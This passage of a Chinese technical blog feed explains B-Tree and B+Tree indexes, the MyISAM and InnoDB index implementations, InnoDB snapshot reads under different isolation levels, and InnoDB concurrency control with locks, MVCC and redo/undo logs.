      <link href="/2018/08/16/2018-08-16-%E7%B4%A2%E5%BC%95%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/2018/08/16/2018-08-16-%E7%B4%A2%E5%BC%95%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 关于索引你必须知道的二三事 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="索引的本质"><a href="#索引的本质" class="headerlink" title="索引的本质"></a>索引的本质</h3><p>MySQL官方对索引的定义为：</p><blockquote><p>索引（Index）是帮助MySQL高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。</p></blockquote><p>我们知道，数据库查询是数据库的最主要功能之一。我们都希望查询数据的速度能尽可能的快，因此数据库系统的设计者会从查询算法的角度进行优化。</p><p>最基本的查询算法当然是<a href="http://en.wikipedia.org/wiki/Linear_search" target="_blank" rel="noopener">顺序查找</a>（linear search），这种复杂度为O(n)的算法在数据量很大时显然是糟糕的，好在计算机科学的发展提供了很多更优秀的查找算法，例如<a href="http://en.wikipedia.org/wiki/Binary_search_algorithm" target="_blank" rel="noopener">二分查找</a>（binary search）、<a href="http://en.wikipedia.org/wiki/Binary_search_tree" target="_blank" rel="noopener">二叉树查找</a>（binary tree search）等。</p><p>如果稍微分析一下会发现，每种查找算法都只能应用于特定的数据结构之上。</p><p>例如二分查找要求被检索数据有序，而二叉树查找只能应用于<a href="http://en.wikipedia.org/wiki/Binary_search_tree" target="_blank" rel="noopener">二叉查找树</a>上，但是数据本身的组织结构不可能完全满足各种数据结构（例如，理论上不可能同时将两列都按顺序进行组织），所以，在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构上实现高级查找算法。</p><p>这种数据结构，就是<strong>索引</strong>。</p><p>看一个例子：</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic1.png"><p>左边是数据表，一共有两列七条记录，最左边的是数据记录的物理地址（注意逻辑上相邻的记录在磁盘上也并不是一定物理相邻的）。为了加快Col2的查找，可以维护一个右边所示的二叉查找树，每个节点分别包含索引键值和一个指向对应数据记录物理地址的指针，这样就可以运用二叉查找在O(log2n)的复杂度内获取到相应数据。</p><p>虽然这是一个货真价实的索引，但是实际的数据库系统几乎没有使用二叉查找树或其进化品种<a href="http://en.wikipedia.org/wiki/Red-black_tree" target="_blank" rel="noopener">红黑树</a>（red-black tree）实现的，原因会在下文介绍。</p><h3 id="B-Tree和B-Tree"><a href="#B-Tree和B-Tree" class="headerlink" title="B-Tree和B+Tree"></a>B-Tree和B+Tree</h3><p>目前大部分数据库系统及文件系统都采用B-Tree或其变种B+Tree作为索引结构，在本文的下一节会结合存储器原理及计算机存取原理讨论为什么B-Tree和B+Tree在被如此广泛用于索引，这一节先单纯从数据结构角度描述它们。</p><h4 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B-Tree"></a>B-Tree</h4><p>为了描述B-Tree，首先定义一条数据记录为一个二元组[key, data]，key为记录的键值，对于不同数据记录，key是互不相同的；data为数据记录除key外的数据。</p><p>那么B-Tree是满足下列条件的数据结构：</p><ul><li>d为大于1的一个正整数，称为B-Tree的度。</li><li>h为一个正整数，称为B-Tree的高度。</li><li>每个非叶子节点由n-1个key和n个指针组成，其中d&lt;=n&lt;=2d。</li><li>每个叶子节点最少包含一个key和两个指针，最多包含2d-1个key和2d个指针，叶节点的指针均为null 。</li><li>所有叶节点具有相同的深度，等于树高h。</li><li>key和指针互相间隔，节点两端是指针。</li><li>一个节点中的key从左到右非递减排列。</li><li>所有节点组成树结构。</li><li>每个指针要么为null，要么指向另外一个节点。</li><li>如果某个指针在节点node最左边且不为null，则其指向节点的所有key小于v(key1)，其中v(key1)为node的第一个key的值。</li><li>如果某个指针在节点node最右边且不为null，则其指向节点的所有key大于v(keym)，其中v(keym)为node的最后一个key的值。</li><li>如果某个指针在节点node的左右相邻key分别是keyi和keyi+1且不为null，则其指向节点的所有key小于v(keyi+1)且大于v(keyi)。</li></ul><p>下面是一个d=2的B-Tree示意图：</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic2.png"><p>由于B-Tree的特性，在B-Tree中按key检索数据的算法非常直观：首先从根节点进行二分查找，如果找到则返回对应节点的data，否则对相应区间的指针指向的节点递归进行查找，直到找到节点或找到null指针，前者查找成功，后者查找失败。</p><p>B-Tree上查找算法的伪代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BTree_Search(node, key) &#123;</span><br><span class="line">    if(node == null) return null;</span><br><span class="line">    foreach(node.key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(node.key[i] == key) return node.data[i];</span><br><span class="line">            if(node.key[i] &gt; key) return BTree_Search(point[i]-&gt;node);</span><br><span class="line">    &#125;</span><br><span class="line">    return BTree_Search(point[i+1]-&gt;node);</span><br><span class="line">&#125;</span><br><span class="line">data = BTree_Search(root, my_key);</span><br></pre></td></tr></table></figure><p>关于B-Tree有一系列有趣的性质，例如一个度为d的B-Tree，设其索引N个key，则其树高h的上限为logd((N+1)/2)，检索一个key，其查找节点个数的渐进复杂度为O(logdN)。从这点可以看出，B-Tree是一个非常有效率的索引数据结构。</p><p>另外，由于插入删除新的数据记录会破坏B-Tree的性质，因此在插入删除时，需要对树进行一个分裂、合并、转移等操作以保持B-Tree性质，本文不打算完整讨论B-Tree这些内容，因为已经有许多资料详细说明了B-Tree的数学性质及插入删除算法，有兴趣的朋友可以在本文末的参考文献一栏找到相应的资料进行阅读。</p><h4 id="B-Tree-1"><a href="#B-Tree-1" class="headerlink" title="B+Tree"></a>B+Tree</h4><p>B-Tree有许多变种，其中最常见的是B+Tree，例如MySQL就普遍使用B+Tree实现其索引结构。</p><p>与B-Tree相比，B+Tree有以下不同点：</p><ul><li>每个节点的指针上限为2d而不是2d+1。</li><li>内节点不存储data，只存储key；叶子节点不存储指针。</li></ul><p>一个简单的B+Tree示意：</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic3.png"><p>由于并不是所有节点都具有相同的域，因此B+Tree中叶节点和内节点一般大小不同。这点与B-Tree不同，虽然B-Tree中不同节点存放的key和指针可能数量不一致，但是每个节点的域和上限是一致的，所以在实现中B-Tree往往对每个节点申请同等大小的空间。</p><p>一般来说，B+Tree比B-Tree更适合实现外存储索引结构，具体原因与外存储器原理及计算机存取原理有关，将在下面讨论。</p><h4 id="带有顺序访问指针的B-Tree"><a href="#带有顺序访问指针的B-Tree" class="headerlink" title="带有顺序访问指针的B+Tree"></a>带有顺序访问指针的B+Tree</h4><p>一般在数据库系统或文件系统中使用的B+Tree结构都在经典B+Tree的基础上进行了优化，增加了顺序访问指针。</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic4.png"><p>如图所示，在B+Tree的每个叶子节点增加一个指向相邻叶子节点的指针，就形成了带有顺序访问指针的B+Tree。</p><p>做这个优化的目的是为了提高区间访问的性能，例如如果要查询key为从18到49的所有数据记录，当找到18后，只需顺着节点和指针顺序遍历就可以一次性访问到所有数据节点，极大提到了区间查询效率。</p><p>这一节对B-Tree和B+Tree进行了一个简单的介绍，下一节结合存储器存取原理介绍为什么目前B+Tree是数据库系统实现索引的首选数据结构。</p><h3 id="为什么使用B-Tree（B-Tree）"><a href="#为什么使用B-Tree（B-Tree）" class="headerlink" title="为什么使用B-Tree（B+Tree）"></a>为什么使用B-Tree（B+Tree）</h3><p>上文说过，红黑树等数据结构也可以用来实现索引，但是文件系统及数据库系统普遍采用B-/+Tree作为索引结构，这一节将结合计算机组成原理相关知识讨论B-/+Tree作为索引的理论基础。</p><p>一般来说，索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I/O消耗，相对于内存存取，I/O存取的消耗要高几个数量级，所以评价一个数据结构作为索引的优劣最重要的指标就是在查找过程中磁盘I/O操作次数的渐进复杂度。换句话说，索引的结构组织要尽量减少查找过程中磁盘I/O的存取次数。</p><p>下面先介绍内存和磁盘存取原理，然后再结合这些原理分析B-/+Tree作为索引的效率。</p><h4 id="主存存取原理"><a href="#主存存取原理" class="headerlink" title="主存存取原理"></a>主存存取原理</h4><p>目前计算机使用的主存基本都是随机读写存储器（RAM），现代RAM的结构和存取原理比较复杂，这里本文抛却具体差别，抽象出一个十分简单的存取模型来说明RAM的工作原理。</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic5.png"><p>从抽象角度看，主存是一系列的存储单元组成的矩阵，每个存储单元存储固定大小的数据。每个存储单元有唯一的地址，现代主存的编址规则比较复杂，这里将其简化成一个二维地址：通过一个行地址和一个列地址可以唯一定位到一个存储单元。图5展示了一个4 x 4的主存模型。</p><p>主存的存取过程如下：</p><ul><li>当系统需要读取主存时，则将地址信号放到地址总线上传给主存，主存读到地址信号后，解析信号并定位到指定存储单元，然后将此存储单元数据放到数据总线上，供其它部件读取。</li><li>写主存的过程类似，系统将要写入单元地址和数据分别放在地址总线和数据总线上，主存读取两个总线的内容，做相应的写操作。</li></ul><p>这里可以看出，主存存取的时间仅与存取次数呈线性关系，因为不存在机械操作，两次存取的数据的“距离”不会对时间有任何影响，例如，先取A0再取A1和先取A0再取D3的时间消耗是一样的。</p><h4 id="磁盘存取原理"><a href="#磁盘存取原理" class="headerlink" title="磁盘存取原理"></a>磁盘存取原理</h4><p>上文说过，索引一般以文件形式存储在磁盘上，索引检索需要磁盘I/O操作。与主存不同，磁盘I/O存在机械运动耗费，因此磁盘I/O的时间消耗是巨大的。</p><p>磁盘的整体结构示意图：</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic6.png"><p>一个磁盘由大小相同且同轴的圆形盘片组成，磁盘可以转动（各个磁盘必须同步转动）。在磁盘的一侧有磁头支架，磁头支架固定了一组磁头，每个磁头负责存取一个磁盘的内容。磁头不能转动，但是可以沿磁盘半径方向运动（实际是斜切向运动），每个磁头同一时刻也必须是同轴的，即从正上方向下看，所有磁头任何时候都是重叠的（不过目前已经有多磁头独立技术，可不受此限制）。</p><p>磁盘结构的示意图：</p><img src="/2018/08/16/2018-08-16-索引背后的数据结构与算法/pic7.png"><p>盘片被划分成一系列同心环，圆心是盘片中心，每个同心环叫做一个磁道，所有半径相同的磁道组成一个柱面。磁道被沿半径线划分成一个个小的段，每个段叫做一个扇区，每个扇区是磁盘的最小存储单元。为了简单起见，我们下面假设磁盘只有一个盘片和一个磁头。</p><p>当需要从磁盘读取数据时，系统会将数据逻辑地址传给磁盘，磁盘的控制电路按照寻址逻辑将逻辑地址翻译成物理地址，即确定要读的数据在哪个磁道，哪个扇区。为了读取这个扇区的数据，需要将磁头放到这个扇区上方，为了实现这一点，磁头需要移动对准相应磁道，这个过程叫做寻道，所耗费时间叫做寻道时间，然后磁盘旋转将目标扇区旋转到磁头下，这个过程耗费的时间叫做旋转时间。</p><h4 id="局部性原理与磁盘预读"><a href="#局部性原理与磁盘预读" class="headerlink" title="局部性原理与磁盘预读"></a>局部性原理与磁盘预读</h4><p>由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分分之一，因此为了提高效率，要尽量减少磁盘I/O。</p><p>为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的局部性原理：</p><blockquote><p>当一个数据被用到时，其附近的数据也通常会马上被使用。</p></blockquote><p>程序运行期间所需要的数据通常比较集中。由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I/O效率。</p><p>预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。</p><h4 id="B-Tree索引的性能分析"><a href="#B-Tree索引的性能分析" class="headerlink" title="B-/+Tree索引的性能分析"></a>B-/+Tree索引的性能分析</h4><p>到这里终于可以分析B-/+Tree索引的性能了。</p><p>上文说过一般使用磁盘I/O次数评价索引结构的优劣。先从B-Tree分析，根据B-Tree的定义，可知检索一次最多需要访问h个节点。数据库系统的设计者巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入。为了达到这个目的，在实际实现B-Tree还需要使用如下技巧：</p><ul><li>每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了一个node只需一次I/O。</li><li>B-Tree中一次检索最多需要h-1次I/O（根节点常驻内存），渐进复杂度为O(h)=O(logdN)。一般实际应用中，出度d是非常大的数字，通常超过100，因此h非常小（通常不超过3）。</li></ul><p>综上所述，用B-Tree作为索引结构效率是非常高的。</p><p>而红黑树这种结构，h明显要深的多。由于逻辑上很近的节点（父子）物理上可能很远，无法利用局部性，所以红黑树的I/O渐进复杂度也为O(h)，效率明显比B-Tree差很多。</p><p>上文还说过，B+Tree更适合外存索引，原因和内节点出度d有关。从上面分析可以看到，d越大索引的性能越好，而出度的上限取决于节点内key和data的大小：dmax=floor(pagesize/(keysize+datasize+pointsize))。由于B+Tree内节点去掉了data域，因此可以拥有更大的出度，拥有更好的性能。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 索引 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL索引实现</title>
      <link href="/2018/08/16/2018-08-17-MySQL%E7%B4%A2%E5%BC%95%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/08/16/2018-08-17-MySQL%E7%B4%A2%E5%BC%95%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 不同存储引擎如何实现索引 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="关于存储引擎"><a href="#关于存储引擎" class="headerlink" title="关于存储引擎"></a>关于存储引擎</h3><p>MySQL的常用存储引擎有四种，下面只讨论其中最多的两种——MyISAM和InnoDB实现索引的方式。</p><p>有关存储引擎的详细说明，请查看<a href="/todo">MySQL的四种存储引擎</a>。</p><h3 id="MyISAM索引实现"><a href="#MyISAM索引实现" class="headerlink" title="MyISAM索引实现"></a>MyISAM索引实现</h3><p>MyISAM引擎使用B+Tree作为索引结构，叶节点的data域存放的是数据记录的地址。</p><p>下图是MyISAM索引的原理图：</p><img src="/2018/08/16/2018-08-17-MySQL索引实现/pic1.png"><p>这里设表一共有三列，假设我们以Col1为主键，则图8是一个MyISAM表的主索引（Primary key）示意。可以看出MyISAM的索引文件仅仅保存数据记录的地址。在MyISAM中，主索引和辅助索引（Secondary key）在结构上没有任何区别，只是主索引要求key是唯一的，而辅助索引的key可以重复。</p><p>如果我们在Col2上建立一个辅助索引，则此索引的结构如下图所示：</p><img src="/2018/08/16/2018-08-17-MySQL索引实现/pic2.png"><p>同样也是一颗B+Tree，data域保存数据记录的地址。因此，MyISAM中索引检索的算法为首先按照B+Tree搜索算法搜索索引，如果指定的Key存在，则取出其data域的值，然后以data域的值为地址，读取相应数据记录。</p><p>MyISAM的索引方式也叫做<strong>非聚集索引</strong>。</p><h3 id="InnoDB索引实现"><a href="#InnoDB索引实现" class="headerlink" title="InnoDB索引实现"></a>InnoDB索引实现</h3><p>虽然InnoDB也使用B+Tree作为索引结构，但具体实现方式却与MyISAM截然不同。</p><p>第一个重大区别是InnoDB的数据文件本身就是索引文件。</p><p>从上文知道，MyISAM索引文件和数据文件是分离的，索引文件仅保存数据记录的地址。而在InnoDB中，表数据文件本身就是按B+Tree组织的一个索引结构，这棵树的叶节点data域保存了完整的数据记录。这个索引的key是数据表的主键，因此InnoDB表数据文件本身就是主索引。</p><img src="/2018/08/16/2018-08-17-MySQL索引实现/pic3.png"><p>上图是InnoDB主索引（同时也是数据文件）的示意图，可以看到叶节点包含了完整的数据记录。这种索引叫做<strong>聚集索引</strong>。</p><p>因为InnoDB的数据文件本身要按主键聚集，所以InnoDB要求表必须有主键（MyISAM可以没有），如果没有显式指定，则MySQL系统会自动选择一个可以唯一标识数据记录的列作为主键，如果不存在这种列，则MySQL自动为InnoDB表生成一个隐含字段作为主键，这个字段长度为6个字节，类型为长整形。</p><p>第二个与MyISAM索引的不同是InnoDB的辅助索引data域存储相应记录主键的值而不是地址。换句话说，InnoDB的所有辅助索引都引用主键作为data域。</p><p>例如，下图为定义在Col3上的一个辅助索引：</p><img src="/2018/08/16/2018-08-17-MySQL索引实现/pic4.png"><p>这里以英文字符的ASCII码作为比较准则。聚集索引这种实现方式使得按主键的搜索十分高效，但是辅助索引搜索需要检索两遍索引：首先检索辅助索引获得主键，然后用主键到主索引中检索获得记录。</p><p>了解不同存储引擎的索引实现方式对于正确使用和优化索引都非常有帮助，例如知道了InnoDB的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引，过长的主索引会令辅助索引变得过大。再例如，用非单调的字段作为主键在InnoDB中不是个好主意，因为InnoDB数据文件本身是一颗B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持B+Tree的特性而频繁的分裂调整，十分低效，而使用自增字段作为主键则是一个很好的选择。</p><h3 id="比较区别"><a href="#比较区别" class="headerlink" title="比较区别"></a>比较区别</h3><p>其实上面已经说的很明白了，下面简要概述一下区别：</p><ul><li>MyISAM的索引和数据是分开存储在两个文件的，索引的数据域存储指向数据的指针；InnoDB的索引和数据存储在一个文件中，索引的数据域存储数据本身。</li><li>MyISAM的辅助索引（二级索引）结构与主索引基本一致，但不用保证唯一性；InnoDB辅助索引的数据域存储主键的值。</li></ul><p>下面的图可以比较清晰的比较两者的不同：</p><img src="/2018/08/16/2018-08-17-MySQL索引实现/pic5.png">]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储引擎 </tag>
            
            <tag> 索引 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InnoDB快照读</title>
      <link href="/2018/08/15/2018-08-15-InnoDB%E5%BF%AB%E7%85%A7%E8%AF%BB/"/>
      <url>/2018/08/15/2018-08-15-InnoDB%E5%BF%AB%E7%85%A7%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> InnoDB，快照读，在RR和RC下有何差异？ <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为了保证文章知识体系的完整性，先简单解释下<strong>快照读</strong>，<strong>读提交</strong>，<strong>可重复读</strong>。</p><p><strong>快照读</strong>(Snapshot Read)</p><p>MySQL数据库，InnoDB存储引擎，为了提高并发，使用MVCC机制，在并发事务时，通过读取数据行的历史数据版本，不加锁，来提高并发的一种不加锁一致性读(Consistent Nonlocking Read)。</p><p><strong>读提交</strong>(Read Committed)</p><ul><li>数据库领域，事务隔离级别的一种，简称RC</li><li>它解决“读脏”问题，保证读取到的数据行都是已提交事务写入的</li><li>它可能存在“读幻影行”问题，同一个事务里，连续相同的read可能读到不同的结果集</li></ul><p><strong>可重复读</strong>(Repeated Read)</p><ul><li>数据库领域，事务隔离级别的一种，简称RR</li><li>它不但解决“读脏”问题，还解决了“读幻影行”问题，同一个事务里，连续相同的read读到相同的结果集</li></ul><p>在<strong>读提交</strong>(RC)，<strong>可重复读</strong>(RR)两个不同的事务的隔离级别下，<strong>快照读</strong>有什么不同呢？</p><p>先说<strong>结论</strong>：</p><ul><li>事务总能够读取到，自己写入(update /insert /delete)的行记录</li><li>RC下，快照读总是能读到最新的行数据快照，当然，必须是已提交事务写入的</li><li>RR下，某个事务首次read记录的时间为T，未来不会读取到T时间之后已提交事务写入的记录，以保证连续相同的read读到相同的结果集</li></ul><p>画外音：可以看到<br>(1) 和并发事务的开始时间没关系，和事务首次read的时间有关；<br>(2) 由于不加锁，和互斥关系也不大；</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>InnoDB表：t(id PK, name)</p><p>表中有三条记录：<br>1, shenjian<br>2, zhangsan<br>3, lisi</p><h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><p>两个并发事务A，B执行的时间序列如下（A先于B开始，B先于A结束）：</p><blockquote><p>A1: start transaction;<br>B1: start transaction;<br>A2: select * from t;<br>B2: insert into t values (4, wangwu);<br>A3: select * from t;<br>B3: commit;<br>A4: select * from t;</p></blockquote><p><strong>提问1</strong>：假设事务的隔离级别是可重复读RR，事务A中的三次查询，A2, A3, A4分别读到什么结果集？</p><p><strong>回答</strong>：RR下</p><ol><li>A2读到的结果集肯定是{1, 2, 3}，这是事务A的第一个read，假设为时间T；</li><li>A3读到的结果集也是{1, 2, 3}，因为B还没有提交；</li><li>A4读到的结果集还是{1, 2, 3}，因为事务B是在时间T之后提交的，A4得读到和A2一样的记录；</li></ol><p><strong>提问2</strong>：假设事务的隔离级别是读提交RC，A2, A3, A4又分别读到什么结果集呢？</p><p><strong>回答</strong>：RC下</p><ol><li>A2读到的结果集是{1, 2, 3}；</li><li>A3读到的结果集也是{1, 2, 3}，因为B还没有提交；</li><li>A4读到的结果集还是{1, 2, 3, 4}，因为事务B已经提交；</li></ol><h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><p>仍然是上面的两个事务，只是A和B开始时间稍有不同（B先于A开始，B先于A结束）：</p><blockquote><p>B1: start transaction;<br>A1: start transaction;<br>A2: select * from t;<br>B2: insert into t values (4, wangwu);<br>A3: select * from t;<br>B3: commit;<br>A4: select * from t;</p></blockquote><p><strong>提问3</strong>：假设事务的隔离级别是可重复读RR，事务A中的三次查询，A2, A3, A4分别读到什么结果集？</p><p><strong>提问4</strong>：假设事务的隔离级别是读提交RC，A2, A3, A4的结果集又是什么呢？</p><p><strong>回答</strong>：事务的开始时间不一样，不会影响“快照读”的结果，所以结果集和case 1一样。</p><h4 id="case-3"><a href="#case-3" class="headerlink" title="case 3"></a>case 3</h4><p>仍然是并发的事务A与B（A先于B开始，B先于A结束）：</p><blockquote><p>A1: start transaction;<br>B1: start transaction;<br>B2: insert into t values (4, wangwu);<br>B3: commit;<br>A2: select * from t;</p></blockquote><p><strong>提问5</strong>：假设事务的隔离级别是可重复读RR，事务A中的A2查询，结果集是什么？</p><p><strong>提问6</strong>：假设事务的隔离级别是读提交RC，A2的结果集又是什么呢？</p><ul><li>在RR下，A2是事务A的第一个read，假设为时间T，它能读取到T之前提交事务写入的数据行，故结果集为{1, 2, 3, 4}；</li><li>在RC下，没有疑问，一定是{1, 2, 3, 4}。</li></ul><h4 id="case-4"><a href="#case-4" class="headerlink" title="case 4"></a>case 4</h4><p>事务开始的时间再换一下（B先于A开始，B先于A结束）：</p><blockquote><p>B1: start transaction;<br>A1: start transaction;<br>B2: insert into t values (4, wangwu);<br>B3: commit;<br>A2: select * from t;</p></blockquote><p><strong>提问7</strong>：假设事务的隔离级别是可重复读RR，事务A中的A2查询，结果集是什么？</p><p><strong>提问8</strong>：假设事务的隔离级别是读提交RC，A2的结果集又是什么呢？</p><p><strong>回答</strong>：事务的开始时间不一样，不会影响“快照读”的结果，所以结果集和case 3一样。</p><p>啰嗦说了这么多，用昨天一位网友“山峰”同学的话<strong>总结</strong>：</p><ul><li>RR下，事务在第一个Read操作时，会建立Read View</li><li>RC下，事务在每次Read操作时，都会建立Read View</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> InnoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InnoDB并发控制</title>
      <link href="/2018/08/14/2018-08-14-InnoDB%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/"/>
      <url>/2018/08/14/2018-08-14-InnoDB%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> InnoDB并发如此高，原因竟然在这？ <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h3><p><strong>为啥要进行并发控制？</strong></p><p>并发的任务对同一个临界资源进行操作，如果不采取措施，可能导致不一致，故必须进行<strong>并发控制</strong>（Concurrency Control）。</p><p><strong>技术上，通常如何进行并发控制？</strong></p><p>通过并发控制保证数据一致性的常见手段有：</p><ul><li>锁（Locking）</li><li>数据多版本（Multi Versioning）</li></ul><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p><strong>如何使用普通锁保证一致性？</strong></p><p>普通锁，被使用最多：</p><ol><li>操作数据前，锁住，实施互斥，不允许其他的并发任务操作；</li><li>操作完成后，释放锁，让其他任务执行；</li></ol><p>如此这般，来保证一致性。</p><p><strong>普通锁存在什么问题？</strong></p><p>简单的锁住太过粗暴，连“读任务”也无法并行，任务执行过程本质上是串行的。</p><p>于是出现了<strong>共享锁</strong>与<strong>排他锁</strong>：</p><ul><li>共享锁（<strong>S</strong>hare Locks，记为S锁），读取数据时加S锁</li><li>排他锁（e<strong>X</strong>clusive Locks，记为X锁），修改数据时加X锁</li></ul><p>共享锁与排他锁的玩法是：</p><ul><li>共享锁之间不互斥，简记为：读读可以并行</li><li>排他锁与任何锁互斥，简记为：写读，写写不可以并行</li></ul><p>可以看到，一旦写数据的任务没有完成，数据是不能被其他任务读取的，这对并发度有较大的影响。</p><p><em>画外音：对应到数据库，可以理解为，写事务没有提交，读相关数据的select也会被阻塞。</em></p><p><strong>有没有可能，进一步提高并发呢？</strong></p><p>即使写任务没有完成，其他读任务也可能并发，这就引出了数据多版本。</p><h3 id="数据多版本"><a href="#数据多版本" class="headerlink" title="数据多版本"></a>数据多版本</h3><p>数据多版本是一种能够进一步提高并发的方法，它的<strong>核心原理</strong>是：</p><ol><li>写任务发生时，将数据克隆一份，以版本号区分；</li><li>写任务操作新克隆的数据，直至提交；</li><li>并发读任务可以继续读取旧版本的数据，不至于阻塞；</li></ol><img src="/2018/08/14/2018-08-14-InnoDB并发控制/pic1.webp"><p>如上图：</p><ol><li>最开始数据的版本是V0；</li><li>T1时刻发起了一个写任务，这是把数据clone了一份，进行修改，版本变为V1，但任务还未完成；</li><li>T2时刻并发了一个读任务，依然可以读V0版本的数据；</li><li>T3时刻又并发了一个读任务，依然不会阻塞；</li></ol><p>可以看到，数据多版本，通过“读取旧版本数据”能够极大提高任务的并发度。</p><p>提高并发的演进思路，就在如此：</p><ul><li><strong>普通锁</strong>，本质是串行执行</li><li><strong>读写锁</strong>，可以实现读读并发</li><li><strong>数据多版本</strong>，可以实现读写并发</li></ul><p><em>画外音：这个思路，比整篇文章的其他技术细节更重要，希望大家牢记。</em></p><p>好，对应到InnoDB上，具体是怎么玩的呢？</p><h3 id="redo-undo-回滚段"><a href="#redo-undo-回滚段" class="headerlink" title="redo,undo,回滚段"></a>redo,undo,回滚段</h3><p>在进一步介绍InnoDB如何使用“读取旧版本数据”极大提高任务的并发度之前，有必要先介绍下redo日志，undo日志，回滚段（rollback segment）。</p><h4 id="为什么要有redo日志？"><a href="#为什么要有redo日志？" class="headerlink" title="为什么要有redo日志？"></a>为什么要有redo日志？</h4><p>数据库事务提交后，必须将更新后的数据刷到磁盘上，以保证ACID特性。磁盘<strong>随机写</strong>性能较低，如果每次都刷盘，会极大影响数据库的吞吐量。</p><p>优化方式是，将修改行为先写到redo日志里（此时变成了<strong>顺序写</strong>），再定期将数据刷到磁盘上，这样能极大提高性能。</p><p><em>画外音：这里的架构设计方法是，<strong>随机写优化为顺序写</strong>，思路更重要。</em></p><p>假如某一时刻，数据库崩溃，还没来得及刷盘的数据，在数据库重启后，会重做redo日志里的内容，以保证已提交事务对数据产生的影响都刷到磁盘上。</p><p><strong>一句话</strong>，redo日志用于保障，已提交事务的ACID特性。</p><h4 id="为什么要有undo日志？"><a href="#为什么要有undo日志？" class="headerlink" title="为什么要有undo日志？"></a>为什么要有undo日志？</h4><p>数据库事务未提交时，会将事务修改数据的镜像（即修改前的旧版本）存放到undo日志里，当事务回滚时，或者数据库奔溃时，可以利用undo日志，即旧版本数据，撤销未提交事务对数据库产生的影响。</p><p><em>画外音：</em></p><ul><li><em>对于<strong>insert操作</strong>，undo日志记录新数据的PK(ROW_ID)，回滚时直接删除；</em></li><li><em>对于<strong>delete/update操作</strong>，undo日志记录旧数据row，回滚时直接恢复；</em></li><li><em>他们分别存放在不同的buffer里。</em></li></ul><p><strong>一句话</strong>，undo日志用于保障，未提交事务不会对数据库的ACID特性产生影响。</p><h4 id="什么是回滚段？"><a href="#什么是回滚段？" class="headerlink" 